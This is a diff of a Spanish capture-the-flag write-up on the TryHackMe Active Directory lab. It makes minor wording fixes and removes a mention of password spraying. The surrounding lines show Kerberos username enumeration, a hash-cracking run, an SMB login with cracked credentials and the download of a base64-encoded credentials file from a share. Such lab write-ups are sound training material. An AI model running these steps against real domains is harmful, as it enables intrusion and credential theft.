@@ -246,7 +246,7 @@ Version: v1.0.3 (9dad6e1) - 07/07/25 - Ronnie Flathers @ropnop
 2025/07/07 09:44:43 >  [+] VALID USERNAME:       ROBIN@spookysec.local
 2025/07/07 09:46:19 >  Done! Tested 73317 usernames (16 valid) in 476.678 seconds
 ```
-Una vez tengamos estos enumerados los pasaremos a otra lista, la cual contendra solo los usuarios existentes en el dominio, posteriormente le haremos un password sprying
+Una vez tengamos estos enumerados los pasaremos a otra lista, la cual contendra solo los usuarios existentes en el dominio.
 
 Podemos encontrar hashes de usuarios que no requieran preautenticación en Kerberos, previamente deberemos apuntar la IP al dominio en /etc/hots
 ```bash
@@ -340,7 +340,7 @@ Hardware.Mon.#1..: Util: 46%
 Started: Tue Jul  8 05:26:23 2025
 Stopped: Tue Jul  8 05:27:04 2025
 ```
-Una vez crackeada la contraseña, accederemos con estas credenciales a los recursos compartid, encontraremos lo siguiente:
+Una vez crackeada la contraseña, accederemos con estas credenciales a los recursos compartidos, encontraremos lo siguiente:
 ```bash
 ┌──(root㉿kali)-[~/THM/AttacktiveDirectory]
 └─# smbclient -L //10.10.187.116/backup -U 'SPOOKYSEC\\svc-admin'
@@ -370,7 +370,7 @@ smb: \> ls
                 8247551 blocks of size 4096. 3571447 blocks available
 smb: \> 
 ```
-Haremos un get del fichero txt y decodificaremos a través de cualquier web, este esta codificado en base64.
+Haremos un get del fichero txt y decodificaremos a través de cualquier web, este está codificado en base64.
 ```bash
 smb: \> get backup_credentials.txt
 getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
